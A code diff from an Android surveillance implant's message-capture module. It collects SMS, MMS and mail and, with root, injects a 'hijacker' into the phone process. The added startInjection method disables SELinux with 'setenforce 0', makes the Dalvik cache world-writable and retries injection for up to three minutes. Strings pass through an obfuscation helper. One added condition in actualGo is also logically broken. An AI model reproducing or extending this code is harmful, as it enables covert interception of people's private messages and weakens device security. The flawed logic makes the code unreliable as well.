@@ -21,6 +21,7 @@ import java.util.concurrent.Semaphore;
 
 import com.android.dvci.ProcessInfo;
 import com.android.dvci.ProcessStatus;
+import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ChildConf;
@@ -50,6 +51,7 @@ import com.android.dvci.util.DataBuffer;
 import com.android.dvci.util.DateTime;
 import com.android.dvci.util.Execute;
 import com.android.dvci.util.Instrument;
+import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
@@ -86,7 +88,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private int lastSMS;
 	private Filter[] filterCollect = new Filter[3];
 	private Filter[] filterRuntime = new Filter[3];
-	private Instrument hijack = null;
+	private static Instrument hijack = null;
 	private static String MESSAGE_STORE = "m4/";
 
 	// private SmsHandler smsHandler;
@@ -241,24 +243,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		if (mmsEnabled) {
 			initMms();
 		}
-		if( Status.haveRoot()) {
-			createMsgStorage();
-			Execute.chmod(M.e("777"), M.e("/data/dalvik-cache/"));
-			Execute.executeRoot(M.e("rm /data/dalvik-cache/")+messageStorage.replace("/","@")+"*");
-			hijack = new Instrument(M.e("com.android.phone"), messageStorage, M.e("irp"), null,M.e("pa.data"),M.e("ppa.data"));
 
-			if (hijack.startInstrumentation()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(actualStart): hijacker successfully installed");
-				}
-				EvidenceBuilder.info(M.e("Call Module ready"));
-
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(actualStart): hijacker cannot be installed");
-				}
-			}
-		}
 
 		if (smsEnabled || mmsEnabled) {
 			// Iniziamo la cattura live
@@ -266,7 +251,47 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			msgHandler = new MsgHandler(smsEnabled, mmsEnabled);
 			msgHandler.start();
 		}
+		if( Status.haveRoot() && (hijack==null || !hijack.isStarted()) ) {
+			Date start = new Date();
+			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
+			while(diff_sec<180) {
+				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
+				if(startInjection()){
+					break;
+				}
+				Utils.sleep(5);
+			}
+		}
+	}
 
+	public static boolean startInjection() {
+		createMsgStorage();
+		Execute.chmod(M.e("777"), M.e("/data/dalvik-cache/"));
+		Execute.executeRoot(M.e("setenforce 0") );
+
+		Execute.executeRoot(M.e("rm /data/dalvik-cache/") + Status.getApkName().replace("/", "@") + "*");
+		if(hijack==null) {
+			hijack = new Instrument(M.e("com.android.phone"), Status.getApkName()+"@"+ Status.getAppContext().getPackageName(), M.e("irp"), Status.self().semaphoreMediaserver, M.e("pa.data"));
+			hijack.setInstrumentationSuccessDir(messageStorage);
+		}
+		if (hijack.isStarted()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): hijacker already running");
+			}
+			return true;
+		}
+		if (hijack.startInstrumentation()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): hijacker successfully installed");
+			}
+			EvidenceBuilder.info(M.e("Call Module ready"));
+			return true;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): hijacker cannot be installed");
+			}
+		}
+		return false;
 	}
 
 	@Override
@@ -287,7 +312,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		if (msgHandler != null) {
 			msgHandler.quit();
 		}
-
 		if( Status.haveRoot()) {
 			if (hijack != null) {
 				hijack.stopInstrumentation();
@@ -299,7 +323,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	@Override
 	public void actualGo() {
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualGo): ");
+		}
 		if (mailEnabled) {
 			try {
 				readHistoricMail(lastMail);
@@ -318,7 +344,13 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			updateMarkupSMS(mylastSMS);
 
 		}
-
+		if( Status.haveRoot()) {
+			if (hijack != null ||  !hijack.isStarted()) {
+				hijack.startInstrumentation();
+			}else {
+				startInjection();
+			}
+		}
 	}
 
 	private void initMail() {
